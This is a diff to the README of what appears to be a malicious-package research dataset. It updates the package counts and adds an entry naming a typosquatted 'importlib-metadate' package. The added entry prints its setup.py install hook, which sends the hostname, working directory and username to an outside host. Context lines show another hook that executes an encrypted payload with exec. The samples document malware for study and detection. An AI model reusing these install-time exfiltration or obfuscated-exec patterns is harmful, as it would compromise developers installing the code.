@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 6,099 versions of the source code of 5,395 malicious packages.
+This data set includes about 6,101 versions of the source code of 5,397 malicious packages.
 
 ## Dataset Format
 
@@ -535,6 +535,21 @@ class ISoCBaTjPLsVbdxvjibMWcFHgcNtfpDzwQpVFCUFERhdMzcSHOefUivrlwPKlRvSNuipCwrneb
                 from fernet import Fernet
                 exec(Fernet(b'QfwZUeQEdWdRN900FHlkogRkaRrUbQ15w5bLprHO8CI=').decrypt(b'gAAAAABmbvUP4TYR920z_RnjSNJZue88X-Xy-Z5T4NBwSlgSwgxIM8OYeSfb3fWY6L4jkak7LzL1JIarsJIFk9FWfactZo44jGDw93QAuPAWGydpk_ZeLwCfeZ3X7TOBvZ2tCZ8VKgT-Ol-BopepZIHls8qx-2IWSKhT6aFergwW-xmRPdc0vn81lA0UgqwjNULokOrW0KpLyroVEzTpCZjiNUuI-vnYOzzdpQjFzkWev9OH8HCrDU4='))
             install.run(self)
+```
+
+### 18 Jun. 2024
+importlib-metadate [99.99] <br>
+testkaralpoc45654 [1.0.0] <br>
+
+```python
+class CustomInstall(install):
+    def run(self):
+        install.run(self)
+        hostname=socket.gethostname()
+        cwd = os.getcwd()
+        username = getpass.getuser()
+        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
+        requests.get("https://kar.al",params = ploads)
 ```
 
 ## About the malicious packages detection
